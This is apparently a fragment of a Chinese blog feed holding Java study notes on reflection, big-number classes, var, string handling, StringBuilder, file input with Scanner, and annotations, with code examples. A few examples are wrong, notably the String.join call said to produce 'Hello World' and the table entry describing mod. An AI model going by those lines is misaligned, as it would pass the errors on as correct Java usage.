id="获取类的结构">获取类的结构</h3><h4 id="获取类的名称">获取类的名称</h4><ul><li><p><code>getName()</code>可以获取包名+类名；</p></li><li><p><code>getSimpleName()</code>可以获取类名。</p></li></ul><h4 id="获取类的属性">获取类的属性</h4><ul><li><code>Field getField(name)</code>根据<code>name</code>获取某个<code>public</code>的属性（包括父类）；</li><li><code>Field getDeclaredField(name)</code>根据<code>name</code>获取某个属性（不包括父类）；</li><li><code>Field[] getFields()</code>获取所有<code>public</code>的属性（包括父类）；</li><li><code>Field[] getDeclaredFields()</code>获取所有属性（不包括父类）。</li></ul><h4 id="获得属性的值">获得属性的值</h4><ul><li><code>Field.get(Object)</code>根据<code>Object</code>实例获取其对应属性的值。</li></ul><h4 id="获取类的方法">获取类的方法</h4><ul><li><code>Method getMethod(name, Class...)</code>获取某个<code>public</code>的方法（包括父类）<code>Classs</code>代表参数类型；</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取某个方法（不包括父类）<code>Classs</code>代表参数类型；</li><li><code>Method[] getMethods()</code>获取所有<code>public</code>的方法（包括父类）；</li><li><code>Method[] getDeclaredMethods()</code>获取所有方法（不包括父类）。</li></ul><h4 id="获取类的构造器">获取类的构造器</h4><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的构造器；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个构造器；</li><li><code>getConstructors()</code>：获取<code>public</code>的构造器；</li><li><code>getDeclaredConstructors()</code>：获取所有构造器。</li></ul><h4 id="例子1：">例子1：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">      <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;cn.icewindy.test.Student&quot;</span>);</span><br><span class="line">      <span class="comment">//获得类的名字</span></span><br><span class="line">      System.out.println(s.getName());      <span class="comment">//out:cn.icewindy.test.Student</span></span><br><span class="line">      System.out.println(s.getSimpleName());<span class="comment">//out:Student</span></span><br><span class="line">      <span class="comment">//获得类的属性</span></span><br><span class="line">      Field[] fields = s.getDeclaredFields();<span class="comment">//获取所有field（不包括父类）</span></span><br><span class="line">      <span class="keyword">for</span> (Field field : fields) &#123;           <span class="comment">//out:</span></span><br><span class="line">         System.out.println(field);         <span class="comment">//private int cn.icewindy.test.Student.ID</span></span><br><span class="line">      &#125;</span><br><span class="line">      Field[] fields2 = s.getFields();<span class="comment">//获取所有public的field（包括父类）</span></span><br><span class="line">      <span class="keyword">for</span> (Field field : fields2) &#123;  <span class="comment">//output:</span></span><br><span class="line">         System.out.println(field);  <span class="comment">//public java.lang.String cn.icewindy.test.Person.name</span></span><br><span class="line">      &#125;                       <span class="comment">//public int cn.icewindy.test.Person.age</span></span><br><span class="line">      <span class="comment">//获得属性的值</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> s.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> field.get(<span class="keyword">new</span> <span class="title class_">Student</span>());<span class="comment">//多态</span></span><br><span class="line">      System.out.println(value);        <span class="comment">//out:icewindy</span></span><br><span class="line">      <span class="comment">//获得类的方法</span></span><br><span class="line">      Method[] methods = s.getMethods();<span class="comment">//获取所有public的method（包括父类）</span></span><br><span class="line">      <span class="keyword">for</span> (Method method : methods) &#123;      <span class="comment">//output:太长了，省略，包括了Object的方法</span></span><br><span class="line">         System.out.println(method);</span><br><span class="line">      &#125;</span><br><span class="line">      Method[] methods2 = s.getDeclaredMethods();<span class="comment">//获取所有method（不包括父类）</span></span><br><span class="line">      <span class="keyword">for</span>(Method method : methods2)&#123;             <span class="comment">//output:</span></span><br><span class="line">         System.out.println(method);             <span class="comment">//public void cn.icewindy.test.Student.study()</span></span><br><span class="line">      &#125;                                <span class="comment">//private void cn.icewindy.test.Student.talk()</span></span><br><span class="line">      <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> s.getMethod(<span class="string">&quot;say&quot;</span>, String.class);<span class="comment">//获取指定method</span></span><br><span class="line">      System.out.println(method);                 <span class="comment">//output:public void cn.icewindy.test.Student.say(java.lang.String)</span></span><br><span class="line">      <span class="comment">//获取类的构造器</span></span><br><span class="line">      Constructor[] constructors = s.getConstructors();<span class="comment">//获取所有public的constructor（包括父类）</span></span><br><span class="line">      <span class="keyword">for</span>(Constructor constructor : constructors)&#123;<span class="comment">//output:public cn.icewindy.test.Student()</span></span><br><span class="line">         System.out.println(constructor);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;icewindy&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">18</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;I am a Student&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ID</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Student is studying&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">talk</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String str)</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Student is saying: &quot;</span>+str);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用方法">调用方法</h4><h4 id="调用构造器">调用构造器</h4><h4 id="例子2：">例子2：</h4>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记零碎补充（1）：大数、用var声明局部变量、字符串</title>
      <link href="/2022/03/29/Java%E7%AC%94%E8%AE%B0%E9%9B%B6%E7%A2%8E%E8%A1%A5%E5%85%85%EF%BC%881%EF%BC%89%EF%BC%9A%E5%A4%A7%E6%95%B0%E3%80%81%E7%94%A8var%E5%A3%B0%E6%98%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2022/03/29/Java%E7%AC%94%E8%AE%B0%E9%9B%B6%E7%A2%8E%E8%A1%A5%E5%85%85%EF%BC%881%EF%BC%89%EF%BC%9A%E5%A4%A7%E6%95%B0%E3%80%81%E7%94%A8var%E5%A3%B0%E6%98%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="大数">大数</h2><p>当基本的整数和浮点数精度不能够满足你的需求的时候，我们就可以引入在<code>java.math</code>包中的两个类——<code>BigInteger</code>和<code>BigDecimal</code>。这两个类可以处理任意长度的数值。</p><p><code>BigInteger</code>类可以处理任何精度的<code>整数运算</code>，而<code>BigDecimal</code>类可以处理任何精度的<code>浮点数运算</code>。</p><p>它们的使用方法非常简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">bi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;...&quot;</span>);<span class="comment">//大整数</span></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;...&quot;</span>);<span class="comment">//大浮点数</span></span><br></pre></td></tr></table></figure><p><code>bi / bd</code>处可以填入任意你想叫的名字，当然，最好还是尊重一下命名规则，除非你想让你的代码无人能够流畅阅读，甚至是刚睡了一觉的你。而<code>...</code>处是填入你想要的给<code>bi / bd</code>赋的数值。</p><p>我们也可以使用静态的<code>valueOf</code>方法将普通的数转换为大数，就像这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">bi</span> <span class="operator">=</span> BigInteger.valueOf(<span class="number">100</span>);<span class="comment">//100这里可以改成别的数或者是变量</span></span><br></pre></td></tr></table></figure><p>由于大数不是基础数据类型，我们就无法使用熟悉的算数运算符来处理大数，而是应该使用大数类型中的方法，下表列出最常见的运算：</p><p>BigInteger：</p><table><thead><tr><th>方法名称</th><th>说明</th></tr></thead><tbody><tr><td>add(BigInteger other)</td><td>做加法运算</td></tr><tr><td>subtract(BigInteger other)</td><td>做减法运算</td></tr><tr><td>multiply(BigInteger other)</td><td>做乘法运算</td></tr><tr><td>divide(BigInteger other)</td><td>做除法运算</td></tr><tr><td>remainder(BigInteger other)</td><td>做取余数运算</td></tr><tr><td>pow(int n)</td><td>做n次方运算</td></tr><tr><td>mod(BigInteger other)</td><td>返回两个大数的和、差、积、商、余数</td></tr></tbody></table><p>BigDecimal：</p><p><code>BigDecimal</code>基本运算大致与<code>BigInteger</code>相同，但除法有所不同，因为需要考虑到除不尽末尾小数的处理方法。</p><table><thead><tr><th>方法名称</th><th>说明</th></tr></thead><tbody><tr><td>add(BigDecimal other)</td><td>做加法运算</td></tr><tr><td>subtract(BigDecimal other)</td><td>做减法运算</td></tr><tr><td>multiply(BigDecimal other)</td><td>做乘法运算</td></tr><tr><td>divide(BigDecimal other)</td><td>做除法运算</td></tr><tr><td>divide(BigDecimal other，int scale,  roundingMode)</td><td>做除法运算，三个参数分别代表除数，商后的位数，近似值的处理模式</td></tr></tbody></table><p>近似值的处理模式有太多种了，这里只介绍一个，即最常见的四舍五入——<code>ROUND_HALF_UP</code>。</p><p>来个例子吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">BigDecimal</span> <span class="variable">bd1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1234567890123456789012345678901234567890&quot;</span>);</span><br><span class="line">      <span class="type">BigDecimal</span> <span class="variable">bd2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;9876543210987654321098765432109876543210&quot;</span>);</span><br><span class="line">      <span class="type">BigDecimal</span> <span class="variable">bd3</span> <span class="operator">=</span> bd1.divide(bd2, <span class="number">10</span>, BigDecimal.ROUND_HALF_UP);</span><br><span class="line">      System.out.println(bd3);<span class="comment">//out:0.1249999989</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用var声明局部变量">用var声明局部变量</h2><p>在Java10以上的版本，对于可以从变量初始值推导出他们的类型的，可以用<code>var</code>关键词声明局部变量。</p><p>注意，一定是在Java10以上的版本，<code>var</code>关键词是在该版本才引入的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;a&quot;</span>, <span class="number">18</span>, <span class="number">100</span>);</span><br><span class="line"><span class="type">var</span> <span class="variable">b</span> <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>var</code>关键词避免了重复写类型名，优化了写代码体验与观感，非常便利。</p><h2 id="字符串">字符串</h2><h3 id="子串">子串</h3><p><code>String</code>类中的<code>substring</code>方法可以从字符串中提取出一个子串。</p><p>使用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> s1.substring(<span class="number">1</span>, <span class="number">3</span>);<span class="comment">//s2 = &quot;el&quot;</span></span><br></pre></td></tr></table></figure><p><code>1</code>处填入的是截取开始的位置，<code>3</code>截取结束的位置。（tips：字符串位置跟数组一样是从0开始的）</p><h3 id="拼接">拼接</h3><p>有截取的方法，那自然有拼接的方法，使用<code>+</code>号就可以拼接起两个字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> s1+s1;<span class="comment">//s2 = &quot;HelloHello&quot;</span></span><br></pre></td></tr></table></figure><p>当一个字符串与非字符串拼接时，非字符串就会转换成字符串进行拼接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">233</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> s1 + i;<span class="comment">//s2 = &quot;Hello233&quot;</span></span><br></pre></td></tr></table></figure><p>这种用法我们就常常用在输出结果。</p><p>当我们希望多个字符串放在一起的时候，我们也可以使用<code>join</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> String.join(s1, <span class="string">&quot; &quot;</span>, s2);<span class="comment">//s3 = &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure><p>在Java11以上的版本，还提供了一个重复某个字符串多次的方法<code>repeat</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> s1.repeat(<span class="number">3</span>);<span class="comment">//s2 = &quot;HelloHelloHello&quot;</span></span><br></pre></td></tr></table></figure><h3 id="不可变字符串">不可变字符串</h3><p>Java的字符串与C语言的字符串不太相同，Java字符串不是一个数组，它的字符串不可以修改里面的某一个字符，想修改字符串，只能通过截取字符串，再重新拼接方式来修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Helle&quot;</span>;</span><br><span class="line">s1 = s1.substring(<span class="number">0</span>, <span class="number">4</span>)+<span class="string">&quot;o!&quot;</span>;<span class="comment">//s1 = &quot;Hello!&quot; </span></span><br></pre></td></tr></table></figure><h3 id="判断字符串是否相等">判断字符串是否相等</h3><p>虽然字符串不是一个数组，但是我们也不能通过<code>==</code>来判断是否相等，而是应该用<code>equals</code>方法来判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">s1.equals(s2);<span class="comment">// false</span></span><br><span class="line">s1.equals(s3);<span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>如果我们想让判断不区分大小写，我们还可以用<code>equalsIgnoreCase</code>来判断。</p><p><code>==</code>判断符只能判断两个字符串是否在同一位置（地址）上，而不能真正判断是否相等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(str.substring(<span class="number">0</span>, <span class="number">3</span>) == <span class="string">&quot;Hel&quot;</span>)&#123;</span><br><span class="line">   System.out.println(<span class="string">&quot;true&quot;</span>);<span class="comment">//</span></span><br><span class="line">&#125;<span class="comment">//none</span></span><br></pre></td></tr></table></figure><h3 id="构建字符串">构建字符串</h3><p>如果我们遇到需要经常拼接的情况，例如读取按键的时候，我们采用上面那种字符串拼接方式，就会导致每次都要构建一个新的<code>String</code>对象，既耗时又浪费空间，效率低下，这时候，我们使用<code>StringBuilder</code>类就可以避免这个问题的发生。</p><p>首先我们需要构建一个空的字符串构造器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br></pre></td></tr></table></figure><p>然后就可以使用<code>StringBuilder</code>类的方法来构建字符串了，下面给出部分常用的方法：</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>append(String str / char c)</td><td>添加一个字符串 / 代码单元</td></tr><tr><td>setCharAt(int i, char c)</td><td>讲第 i 个代码单元替换为 c</td></tr><tr><td>insert(int i, String str / char c)</td><td>在 i 的位置插入字符串str / 代码单元 c</td></tr><tr><td>delete(int i, int j)</td><td>删除 i 到 j 的代码单元</td></tr></tbody></table><p>在构建完字符串之后就可以使用<code>toString</code>返回一个字符串了。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">builder.append(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">builder.append(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">System.out.println(builder.toString());<span class="comment">//out:helloworld</span></span><br></pre></td></tr></table></figure><h2 id="文件的输入输出">文件的输入输出</h2><p>当我们需要读取一个文件，需要构建一个<code>Scanner</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Path.of(<span class="string">&quot;test.txt&quot;</span>), StandardCharsets.UTF_8);</span><br></pre></td></tr></table></figure><p><code>Path.of(&quot;...&quot;)</code>这里面填入的是文件的位置，当你填入像上面那种相对地址时，该相对地址是相对于Java虚拟机启动目录的位置，实际上我认为还是填入绝对地址比较方便，例如<code>c:\\testPath\\test.txt</code>、<code>/home/icewindy/testPath/test.txt</code>。</p><p><code>StandardCharsets.UTF_8</code>很容易看出，这里填入的是文件的编码格式，如果不指定文件的编码格式，则会使用运行该程序的机器的“默认编码”，或许会导致不同平台上运行效果的差异，不建议这样使用。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（6）：注解</title>
      <link href="/2022/03/24/Java%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%EF%BC%9A%E6%B3%A8%E8%A7%A3/"/>
      <url>/2022/03/24/Java%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89%EF%BC%9A%E6%B3%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="注解">注解</h2><p>注解就是带有一定功能的注释。</p><h3 id="内置的注解">内置的注解</h3><h4 id="override">@Override</h4><p>该注解我们在前面的学习中也见到过多次了，这个注解是声明下面的方法重写了超类中的方法，如果注解下面的方法没有重写超类中的方法，则编译器报错。</p><h4 id="deprecated">@Deprecated</h4><p>这个注解表示该程序元素是不鼓励使用的，因为通常的，它是危险的，或者是已经存在更好的替代方法。该注解会使编译器在出现该程序元素的代码处发出警告。</p><h4 id="suppresswarnings">@SuppressWarnings(&quot;…&quot;)</h4><p>镇压警告。</p><p>它与前面两种注解不太相同，这个注解需要一个参数。</p><p><code>SuppressWarnings</code>常用的参数的表格：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>deprecation</td><td>使用了不赞成使用的类或方法时的警告</td></tr><tr><td>unchecked</td><td>执行了未检查的转换时的警告，例如当使用集合时没有用泛型 (Generics) 来指定集合保存的类型。</td></tr><tr><td>fallthrough</td><td>当 Switch 程序块直接通往下一种情况而没有 Break 时的警告。</td></tr><tr><td>path</td><td>在类路径、源文件路径等中有不存在的路径时的警告。</td></tr><tr><td>serial</td><td>当在可序列化的类上缺少 serialVersionUID 定义时的警告。</td></tr><tr><td>finally</td><td>任何 finally 子句不能正常完成时的警告。</td></tr><tr><td>all</td><td>关于以上所有情况的警告。</td></tr></tbody></table><h3 id="元注解">元注解</h3><p>元注解的作用是负责注解（定义）其他的注解。</p><h4 id="target-value">@Target(value = …)</h4><p>描述注解适用的范围（注解可以用在什么地方）。</p><p><code>...</code>处填入java.lang.annotation.ElementType 枚举类型，ElementType 常用的枚举常量在下表：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>CONSTRUCTOR</td><td>用于构造方法</td></tr><tr><td>FIELD</td><td>用于成员变量（包括枚举常量）</td></tr><tr><td>LOCAL_VARIABLE</td><td>用于局部变量</td></tr><tr><td>METHOD</td><td>用于方法</td></tr><tr><td>PACKAGE</td><td>用于包</td></tr><tr><td>PARAMETER</td><td>用于类型参数（JDK 1.8新增）</td></tr><tr><td>TYPE</td><td>用于类、接口（包括注解类型）或 enum 声明</td></tr></tbody></table><p>例：</p><p>TestAnnotation：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(value = &#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> TestAnnotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">   <span class="meta">@TestAnnotation</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="retention-value">@Retention(value = …)</h4><p>表示需要在什么级别保存该注释信息，用于描述注解的生命周期。</p><p><code>...</code>处填入java.lang.annotation.RetentionPolicy 枚举类型，RetentionPolicy 有 3 个枚举常量，如下所示：</p><p>SOURCE：在源代码时，该注解生效；</p><p>CLASS：在class文件时，该注解仍然生效；</p><p>RUNTIME：在运行的时候，该注解仍然生效；</p><p>生命周期：SOURCE &lt; CLASS &lt; <strong>RUNTIME（常用）</strong>。</p><h4 id="documented">@Documented</h4><p>说明该注解将会包含在javadoc中。</p><h4 id="inherited">@Inherited</h4><p>说明子类可以继承父类中的该注解。</p><h3 id="自定义注解">自定义注解</h3><p>使用<code>@interface</code>自定义注解时，自动继承了<code>java.lang.annotation</code>接口。</p><p>自定义注解一般以<code>public @interface ...</code>的格式，在类里生命一个注解时候，需去除<code>public</code>。</p><p>一般来说，当注解内参数只有一个值时，值的名字可以命名为<code>vlaue</code>。因为在注解内参数只有一个值且值的名字为<code>value</code>的时候，往往可以将<code>value</code>省略。</p><p>如果自定义注解里没有成员，则表明是一个标识作用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">   <span class="meta">@MyAnnotation(name = &quot;test&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@MyAnnotation2(&quot;test&quot;)</span><span class="comment">//只有一个参数可以省略value，而且省略只能省略以value命名的参数</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(value = &#123;ElementType.TYPE, ElementType.METHOD&#125;)</span><span class="comment">//指定注解的作用目标</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="comment">//指定注解的生命周期</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">   <span 